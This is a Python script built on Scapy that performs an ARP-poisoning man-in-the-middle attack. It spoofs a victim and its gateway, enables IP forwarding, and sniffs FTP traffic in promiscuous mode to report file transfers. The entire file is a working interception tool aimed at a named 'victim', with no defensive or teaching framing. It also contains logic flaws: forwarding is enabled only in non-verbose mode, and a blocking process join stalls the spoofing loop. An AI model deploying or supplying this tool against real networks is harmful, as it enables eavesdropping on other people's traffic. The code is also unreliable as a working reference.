from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
from datetime import datetime
from multiprocessing import Process
from scapy.all import sniff

def log_exception(exception, need_print):
    f = open('log.txt', 'a')
    date = datetime.now()
    date = str(date)
    if need_print == 1:
        print("log file writing")
    f.write('\n%s: ' % date)
    f.write(' Error -> %s' % exception)
    f.close()

def sniffing(verbose=None):
    try:
        for packet in sniff(filter="port 21", count=-1, prn=lambda x: process_packet(x, verbose), promisc=1, iface="eth0"):
            pass
    except Exception as e:
        log_exception(e, 1)
        print(e)
        os._exit(os.EX_OK)

def process_packet(packet, verbose=None):
    if 'TCP' in packet:
        tcp_packet = packet['TCP']
        if 'Raw' in tcp_packet:
            payload = tcp_packet['Raw'].load
            dec_payload = payload.decode('ISO-8859-1', 'strict')
            if "STOR" in dec_payload or "STOU" in dec_payload or "RETR" in dec_payload:
                split_payload = dec_payload.split(" ")
                print("[+]: Files transferring", split_payload[-1])
    if verbose:
        print("[+]: Payload len=", len(packet))
        print("[+]: Time", time.time())
        print("[+]: Payload", packet)


def enable_ip_route(verbose=True):
    if verbose:
        print("[!] Enabling IP Routing...")
    else:
        _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")

def _enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == "1\n":
            return
    with open(file_path, "w") as f:
        print("1", file=f)

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {}: {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=1)
    if verbose:
        print("[+] Sent to {}: {} is-at {}".format(target_ip, host_ip, host_mac))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.add_argument("target", help="Victim IP Address to ARP poison")
    parser.add_argument("mac_t", help="Victim MAC Address to ARP poison")
    parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
    parser.add_argument("mac_h", help="Host MAC Address, the host you wish to intercept packets for (usually the gateway)")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
    args = parser.parse_args()
    target, mac_t, host, mac_h, verbose = args.target, args.mac_t, args.host, args.mac_h, args.verbose
    if mac_t != get_mac(target) or mac_h != get_mac(host):
        log_exception("MAC/IP not valid", 1)
        print("MAC/IP not valid")
        os._exit(os.EX_OK)
    enable_ip_route()

    try:
        has_run = 0
        while True:
            spoof(target, host, verbose)
            spoof(host, target, verbose)
            if has_run == 0:
                p = Process(target=sniffing, args=(verbose,))
                p.start()
                p.join()
                has_run = 1
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! Restoring the network, please wait...")
        p.kill()
        restore(target, host)
        restore(host, target)